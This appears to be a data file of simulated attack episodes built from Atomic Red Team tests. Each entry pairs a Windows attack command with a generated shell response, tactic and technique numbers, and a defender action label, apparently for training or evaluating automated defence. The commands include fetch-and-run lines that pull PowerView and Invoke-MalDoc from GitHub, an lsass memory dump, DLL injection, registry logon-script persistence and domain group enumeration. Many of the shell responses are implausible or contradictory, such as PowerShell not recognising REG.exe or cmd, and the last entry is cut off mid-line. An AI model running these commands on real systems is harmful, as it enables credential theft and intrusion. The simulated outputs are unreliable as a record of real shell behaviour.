+response:PS C:\Users\chris> %LOCALAPPDATA:~-3,1%md : The term '%LOCALAPPDATA:~-3,1%md' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris> REG.exe : The term 'REG.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.001\src\x64\T1055.001.dll") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris> New-Item : Cannot find path 'C:\atomics\T1055.001\src\x64' because it does not exist.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1055.001\src\x64\T1055.001.dll") -ErrorAction ignore | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.001\src\x64:String) [New-Item], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "C:\atomics\T1055.001\src\x64\T1055.001.dll"
+response:PS C:\Users\chris> Invoke-WebRequest : Cannot connect to the remote server
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/mast ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequest
+PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ Restore to original state }
+command:$mypid = (Start-Process notepad -PassThru).id
+response:PS C:\Users\chris> $mypid = (Start-Process notepad -PassThru).id
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:mavinject $mypid /INJECTRUNNING "C:\atomics\T1055.001\src\x64\T1055.001.dll"
+response:PS C:\Users\chris> mavinject : The term 'mavinject' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ Restore to original state }
+command:Stop-Process -processname notepad
+response:PS C:\Users\chris> Stop-Process : No process found with the name 'notepad'.
+At line:1 char:1
++ Stop-Process -processname notepad
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (notepad:String) [Stop-Process], ProcessCommandException
+    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.StopProcessCommand
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris> REG.exe : The term 'REG.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:6
+technique:37
+
+
+action:{ Restore to original state }
+command:query user /SERVER:%COMPUTERNAME%
+response:PS C:\Users\chris> query user /SERVER:localhost  
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME  
+>chris                 console             1  Active      none       10/1/2023 9:56 AM  
+
+PS C:\Users\chris>
+tactic:0
+technique:29
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"
+response:PS C:\Users\chris> echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"
+Hello from the Windows Command Prompt!
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:11
+technique:141
+
+
+action:{ Restore to original state }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+PS C:\Users\chris>
+tactic:1
+technique:194
+
+
+action:{ Restore to original state }
+command:IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+response:PS C:\Users\chris> IEX : The term 'IEX' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:5
+technique:103
+
+
+action:{ Restore to original state }
+command:Invoke-Maldoc -macroFile "C:\atomics\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
+response:PS C:\Users\chris> Invoke-Maldoc : The term 'Invoke-Maldoc' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:6
+technique:149
+
+
+action:{ Restore to original state }
+command:& "C:\atomics\..\ExternalPayloads\AdFind.exe" None -h $env:USERDOMAIN -s subtree -f "objectclass=computer" *
+response:PS C:\Users\chris> & : The term 'C:\atomics\..\ExternalPayloads\AdFind.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:0
+technique:66
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:Write-Host "Setup C2 server manually"
+response:Setup C2 server manually
+PS C:\Users\chris>
+tactic:1
+technique:9
+
+
+action:{ Restore to original state }
+command:C:\atomics\T1071\bin\telnet_client.exe 127.0.0.1 --port 23
+response:PS C:\Users\chris> C:\atomics\T1071\bin\telnet_client.exe : The term 'C:\atomics\T1071\bin\telnet_client.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:7
+technique:1
+
+
+action:{ Restore to original state }
+command:echo Sorry, Promoting this machine to a Domain Controller must be done manually
+response:Sorry, Promoting this machine to a Domain Controller must be done manually
+PS C:\Users\chris>
+tactic:11
+technique:131
+
+
+action:{ Restore to original state }
+command:vssadmin.exe create shadow /for=C:
+response:PS C:\Users\chris> vssadmin.exe : The term 'vssadmin.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:$C:\atomics\T1055.012\bin\x64\CreateProcess.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:PS C:\Users\chris> $C:\atomics\T1055.012\bin\x64\CreateProcess.exe : The term '$C:\atomics\T1055.012\bin\x64\CreateProcess.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris> New-Item : Cannot find path 'C:\atomics\T1055.011\bin' because it does not exist.
+At line:1 char:1
++ New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.011\bin:String) [New-Item], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:PS C:\Users\chris> Invoke-WebRequest : Cannot connect to the remote server
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/mast ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequest
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:PS C:\Users\chris> Invoke-WebRequest : Cannot connect to the remote server
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/mast ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequest
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:PS C:\Users\chris> C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe : The term 'C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()
+response:PS C:\Users\chris> ([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()
+ 
+Name                 : Domain Admins
+DistinguishedName    : CN=Domain Admins,CN=Users,DC=hslab,DC=com
+ObjectClass          : group
+ObjectCategory       : CN=Group,CN=Schema,DC=Microsoft-DC
+...
+[additional groups as applicable]
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris> New-Item : Cannot find path 'C:\atomics\..\ExternalPayloads\' because it does not exist.
+At line:1 char:1
++ New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\..\ExternalPayloads\:String) [New-Item], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:1
+technique:140
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "C:\atomics\..\ExternalPayloads\Procdump.zip"
+response:PS C:\Users\chris> Invoke-WebRequest : Cannot connect to the remote server
+At line:1 char:1
++ Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "C:\atomics\..\ExternalPayloads\Procdump.zip"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequest
+PS C:\Users\chris>
+tactic:4
+technique:120
+
+
+action:{ Restore to original state }
+command:Expand-Archive "C:\atomics\..\ExternalPayloads\Procdump.zip" "C:\atomics\..\ExternalPayloads\Procdump" -Force
+response:PS C:\Users\chris> Expand-Archive : Cannot find path 'C:\atomics\..\ExternalPayloads\Procdump.zip' because it does not exist.
+At line:1 char:1
++ Expand-Archive "C:\atomics\..\ExternalPayloads\Procdump.zip" "C:\atomics\..\ExternalPayloads\Procdump" -Force
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\..\ExternalPayloads\Procdump.zip:String) [Expand-Archive], FileNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.ExpandArchiveCommand
+PS C:\Users\chris>
+tactic:8
+technique:140
+
+
+action:{ Restore to original state }
+command:New-Item -ItemType Directory (Split-Path "C:\atomics\..\ExternalPayloads\procdump.exe") -Force | Out-Null
+response:PS C:\Users\chris> New-Item : Cannot find path 'C:\atomics\..\ExternalPayloads' because it does not exist.
+At line:1 char:1
++ New-Item -ItemType Directory (Split-Path "C:\atomics\..\ExternalPayloads\procdump.exe") -Force | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\..\ExternalPayloads:String) [New-Item], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:4
+technique:140
+
+
+action:{ Restore to original state }
+command:Copy-Item "C:\atomics\..\ExternalPayloads\Procdump\Procdump.exe" "C:\atomics\..\ExternalPayloads\procdump.exe" -Force
+response:PS C:\Users\chris> Copy-Item : Cannot find path 'C:\atomics\..\ExternalPayloads\Procdump\Procdump.exe' because it does not exist.
+At line:1 char:1
++ Copy-Item "C:\atomics\..\ExternalPayloads\Procdump\Procdump.exe" "C:\atomics\..\ExternalPayloads\procdump.exe" -Force
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\..\ExternalPayloads\Procdump\Procdump.exe:String) [Copy-Item], FileNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand
+PS C:\Users\chris>
+tactic:5
+technique:131
+
+
+action:{ Restore to original state }
+command:"C:\atomics\..\ExternalPayloads\procdump.exe" -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp
+response:PS C:\Users\chris> "C:\atomics\..\ExternalPayloads\procdump.exe" : The term 'C:\atomics\..\ExternalPayloads\procdump.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:0
+technique:103
+
+
+action:{ Restore to original state }
+command:$startingDirectory = "C:\Users"
+response:PS C:\Users\chris> $startingDirectory = "C:\Users"
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ Restore to original state }
+command:$outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+response:PS C:\Users\chris> $outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+PS C:\Users\chris>
+tactic:5
+technique:124
+
+
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1059.003\src\t1059.003_cmd.cmd") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
+response:DestinationFolder 'C:\atomics\T1059.003\src' does not exist.
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:cmd /r cmd<"C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
+response:'cmd' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:8
+technique:181
+
+
+action:{ Restore to original state }
+command:net.exe start >> %temp%\service-list.txt
+response:The service command is deprecated and may not work as expected. 
+PS C:\Users\chris>
+tactic:10
+technique:10
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:csc : The term 'csc' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ csc -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
++ ~~~
+    + CategoryInfo          : ObjectNotFound: (csc:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:%TEMP%\T1010.exe
+response:'\\TEMP\\T1010.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:6
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:10
+technique:10
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:csc : The term 'csc' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ csc -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
++ ~~~
+    + CategoryInfo          : ObjectNotFound: (csc:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:9
+technique:10
+
+
+action:{ Restore to original state }
+command:%TEMP%\T1010.exe
+response:'\\TEMP\\T1010.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command: c:\windows\system32\cmd.exe /c cd /d %TEMP%\ & echo Set objShell = CreateObject("WScript.Shell"):Set objExec = objShell.Exec("whoami"):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs
+response:'AtomicTest.vbs' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:4
+technique:195
+
+
+action:{ Restore to original state }
+command:net groups "Account Operators" /doma
+response:The syntax of this command is:
+
+NET GROUP [groupname [[/DOMAIN] [/ADD [/DOMAIN]] [/DELETE [/DOMAIN]]]]
+
+PS C:\Users\chris>
+tactic:4
+technique:134
+
+
+action:{ Restore to original state }
+command:net groups "Exchange Organization Management" /doma
+response:The syntax of this command is:
+
+NET GROUP [groupname [[/DOMAIN] [/ADD [/DOMAIN]] [/DELETE [/DOMAIN]]]]
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net group "BUILTIN\Backup Operators" /doma
+response:The command completed successfully.
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net group /domai "Domain Admins"
+response:The syntax of this command is:
+
+NET GROUP [groupname [[/DOMAIN] [/ADD [/DOMAIN]] [/DELETE [/DOMAIN]]]]
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.015\bin\ListPlanting.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe" -OutFile "C:\atomics\T1055.015\bin\ListPlanting.exe"
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException
+
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Start-Process "C:\atomics\T1055.015\bin\ListPlanting.exe"
+response:Start-Process : Cannot find path 'C:\atomics\T1055.015\bin\ListPlanting.exe' because it does not exist.
+At line:1 char:1
++ Start-Process "C:\atomics\T1055.015\bin\ListPlanting.exe"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.015\bin\ListPlanting.exe:String) [Start-Process], FileNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.StartProcessCommand
+
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Start-Sleep -Seconds 7
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+response:PS C:\Users\chris>
+tactic:0
+technique:9
+
+
+action:{ Restore to original state }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:0
+technique:134
+
+
+action:{ Restore to original state }
+command:IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
+response:IEX : The remote name could not be resolved: 'raw.githubusercontent.com'
+At line:1 char:1
++ IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Invoke-Expression], RuntimeException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:$C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
+response:At line:1
+Char: 1
++ $C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
++ ~
+Missing '=' operator after unary operator '$'.
+At line:1
++ $C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEqualsInAssignment
+
+PS C:\Users\chris>
+tactic:0
+technique:40
+
+
+action:{ Restore to original state }
+command:echo Sorry, Promoting this machine to a Domain Controller must be done manually
+response:Sorry, Promoting this machine to a Domain Controller must be done manually
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:wmic shadowcopy call create Volume=C:\
+response:ReturnValue = 1
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:0
+technique:9
+
+
+action:{ Restore to original state }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:1
+technique:194
+
+
+action:{ Restore to original state }
+command:IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+response:IEX : The remote name could not be resolved: 'raw.githubusercontent.com'
+At line:1 char:1
++ IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/ma ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Invoke-Expression], RuntimeException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException
+
+PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:10
+
+
+action:{ Block this command this time }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:New-Item : Cannot create a file when that file already exists.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [New-Item], IOException
+    + FullyQualifiedErrorId : System.IO.IOException, Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:10
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:Invoke-WebRequest : Destination path "C:\atomics\T1010\src\T1010.cs" already exists.
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
